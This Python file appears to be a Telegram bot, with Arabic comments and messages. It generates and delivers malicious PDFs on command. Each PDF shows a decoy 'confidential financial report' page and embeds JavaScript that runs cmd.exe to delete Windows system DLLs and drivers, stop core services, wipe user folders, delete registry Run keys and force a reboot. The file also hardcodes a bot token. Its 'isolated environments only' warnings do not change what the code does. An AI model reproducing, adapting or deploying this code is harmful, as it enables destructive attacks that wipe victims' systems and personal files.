import os
import time
import requests
import json
import base64
import random
from datetime import datetime
from flask import Flask, request, jsonify
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from io import BytesIO

app = Flask(__name__)

# ============ تكوين البوت (محدث) ============
TELEGRAM_CONFIG = {
    "TOKEN": "8872991146:AAEGEnOk2AvkKaHgRO7JRJiTSkTGj6CiGRA",
    "CHAT_ID": "7822155315",
    "API_URL": "https://api.telegram.org/bot"
}

# ============ دوال إنشاء PDF التخريبي ============
def generate_destructive_pdf():
    """إنشاء ملف PDF تخريبي"""
    try:
        # إنشاء صفحة عادية للتضليل
        packet = BytesIO()
        c = canvas.Canvas(packet)
        c.drawString(100, 750, "📄 تقرير مالي - سري للغاية")
        c.drawString(100, 720, "يُرجى فتح الملف باستخدام Adobe Reader")
        c.drawString(100, 690, "تم التوليد بواسطة: @hkyyykk_bot")
        c.save()
        
        packet.seek(0)
        new_pdf = PdfReader(packet)
        writer = PdfWriter()
        writer.add_page(new_pdf.pages[0])
        
        # الكود التخريبي
        destructive_js = """
        // ======== كود تخريبي لنظام Windows ========
        try {
            var shell = new ActiveXObject("WScript.Shell");
            
            // 1. حذف ملفات النظام الأساسية
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            
            // 2. تعطيل الخدمات الأساسية
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            
            // 3. حذف ملفات المستخدم
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            
            // 4. تعطيل التسجيل (Registry)
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            
            // 5. إعادة التشغيل القسري
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            
            // 6. عرض رسالة ترهيب
            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
            
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        // ======== نهاية الكود ========
        """
        
        writer.add_js(destructive_js)
        
        # حفظ الملف
        filename = f"destructive_{int(time.time())}.pdf"
        filepath = os.path.join("/tmp", filename)
        with open(filepath, 'wb') as f:
            writer.write(f)
        
        return filepath
    except Exception as e:
        print(f"خطأ في توليد PDF: {e}")
        return None

# ============ دوال البوت ============
def send_telegram_message(chat_id, message, reply_markup=None):
    """إرسال رسالة مع أزرار"""
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
            "reply_markup": reply_markup
        }
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except:
        return False

def send_telegram_file(chat_id, file_path, caption=""):
    """إرسال ملف إلى تيلجرام"""
    try:
        if not os.path.exists(file_path):
            return False
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

def generate_keyboard():
    """توليد أزرار التحكم"""
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "⚒️ توليد PDF تخريبي", "callback_data": "generate_pdf"},
                {"text": "📊 الحالة", "callback_data": "status"}
            ],
            [
                {"text": "❌ إيقاف البوت", "callback_data": "stop_bot"},
                {"text": "📖 المساعدة", "callback_data": "help"}
            ]
        ]
    }
    return json.dumps(keyboard)

# ============ معالجة الأوامر ============
def handle_command(command, chat_id):
    """معالجة الأوامر النصية"""
    command = command.lower().strip()
    
    if command == "/start":
        msg = """
🔐 <b>مرحباً بك في بوت توليد PDF التخريبي!</b>

⚒️ اضغط على الزر أدناه لتوليد ملف PDF يقوم بتعطيل نظام Windows.

⚠️ <b>تحذير:</b> للاستخدام التعليمي فقط في بيئات معزولة!
        """
        send_telegram_message(chat_id, msg, generate_keyboard())
    
    elif command == "/help":
        msg = """
📋 <b>الأوامر المتاحة:</b>

/start - عرض القائمة الرئيسية
/help - عرض هذه الرسالة
/generate - توليد PDF تخريبي
/status - عرض حالة البوت
/stop - إيقاف البوت

⚒️ استخدم الأزرار للتحكم بسهولة!
        """
        send_telegram_message(chat_id, msg, generate_keyboard())
    
    elif command == "/generate":
        generate_and_send_pdf(chat_id)
    
    elif command == "/status":
        msg = f"""
🟢 <b>حالة البوت:</b>
✅ يعمل بنجاح
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 المستخدم: {chat_id}
        """
        send_telegram_message(chat_id, msg, generate_keyboard())
    
    elif command == "/stop":
        send_telegram_message(chat_id, "💀 جاري إيقاف البوت...")
        time.sleep(1)
        os._exit(0)
    
    else:
        send_telegram_message(chat_id, f"⚠️ أمر غير معروف: {command}\nاستخدم /help للمساعدة", generate_keyboard())

def handle_callback(callback_data, chat_id):
    """معالجة الضغط على الأزرار"""
    if callback_data == "generate_pdf":
        generate_and_send_pdf(chat_id)
    
    elif callback_data == "status":
        msg = f"""
🟢 <b>حالة البوت:</b>
✅ يعمل بنجاح
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 المستخدم: {chat_id}
        """
        send_telegram_message(chat_id, msg, generate_keyboard())
    
    elif callback_data == "stop_bot":
        send_telegram_message(chat_id, "💀 <b>جارٍ إيقاف البوت...</b>")
        time.sleep(1)
        os._exit(0)
    
    elif callback_data == "help":
        msg = """
📋 <b>الأوامر المتاحة:</b>

⚒️ توليد PDF تخريبي - إنشاء ملف PDF يُعطل النظام
📊 الحالة - عرض معلومات البوت
❌ إيقاف البوت - إيقاف تشغيل البوت
📖 المساعدة - عرض هذه الرسالة

⚠️ <b>تحذير:</b> استخدم الملفات في بيئات معزولة فقط!
        """
        send_telegram_message(chat_id, msg, generate_keyboard())

def generate_and_send_pdf(chat_id):
    """توليد وإرسال PDF"""
    send_telegram_message(chat_id, "⏳ <b>جارٍ توليد PDF التخريبي...</b>")
    
    # توليد الملف
    filepath = generate_destructive_pdf()
    
    if filepath and os.path.exists(filepath):
        # إرسال الملف
        caption = """
⚒️ <b>تم توليد PDF التخريبي بنجاح!</b>

⚠️ <b>تحذير:</b> هذا الملف يقوم بـ:
• حذف ملفات النظام الأساسية
• تعطيل الخدمات الحيوية
• حذف الملفات الشخصية
• إعادة تشغيل النظام قسرياً

🔴 <b>استخدمه فقط في بيئة افتراضية معزولة!</b>
        """
        
        if send_telegram_file(chat_id, filepath, caption):
            send_telegram_message(chat_id, "✅ تم إرسال الملف بنجاح!", generate_keyboard())
        else:
            send_telegram_message(chat_id, "❌ فشل إرسال الملف!", generate_keyboard())
        
        # حذف الملف المؤقت
        try:
            os.remove(filepath)
        except:
            pass
    else:
        send_telegram_message(chat_id, "❌ فشل توليد الملف!", generate_keyboard())

# ============ ويب هوك ============
@app.route(f'/webhook/{TELEGRAM_CONFIG["TOKEN"]}', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        
        if not data:
            return "No data", 400
        
        # معالجة الرسائل
        message = data.get('message', {})
        chat_id = message.get('chat', {}).get('id')
        
        # التحقق من الصلاحية
        if str(chat_id) != TELEGRAM_CONFIG['CHAT_ID']:
            send_telegram_message(chat_id, "⛔ غير مصرح!")
            return "Unauthorized", 403
        
        # معالجة النص
        text = message.get('text', '')
        if text:
            handle_command(text, chat_id)
            return "OK", 200
        
        # معالجة الضغط على الأزرار (Callback Query)
        callback_query = data.get('callback_query')
        if callback_query:
            callback_data = callback_query.get('data', '')
            chat_id = callback_query.get('message', {}).get('chat', {}).get('id')
            if str(chat_id) == TELEGRAM_CONFIG['CHAT_ID']:
                handle_callback(callback_data, chat_id)
            return "OK", 200
        
        return "OK", 200
        
    except Exception as e:
        print(f"خطأ في webhook: {e}")
        return "Error", 500

@app.route('/')
def home():
    return "✅ Bot is running on Render with PDF Generator!"

@app.route('/health')
def health():
    return "OK", 200

# ============ تسجيل Webhook ============
def set_webhook():
    try:
        webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'localhost')}/webhook/{TELEGRAM_CONFIG['TOKEN']}"
        
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/setWebhook"
        params = {"url": webhook_url}
        response = requests.post(url, data=params)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                print(f"✅ Webhook تم تسجيله: {webhook_url}")
                return True
        return False
    except Exception as e:
        print(f"❌ خطأ في تسجيل Webhook: {e}")
        return False

# ============ التشغيل الرئيسي ============
if __name__ == "__main__":
    # تثبيت المكتبات (للتأكد)
    try:
        import PyPDF2
        import reportlab
    except ImportError:
        print("⚠️ يرجى تثبيت المكتبات: pip install PyPDF2 reportlab")
    
    # تسجيل Webhook
    set_webhook()
    
    # تشغيل الخادم
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 البوت يعمل على المنفذ {port}")
    app.run(host='0.0.0.0', port=port)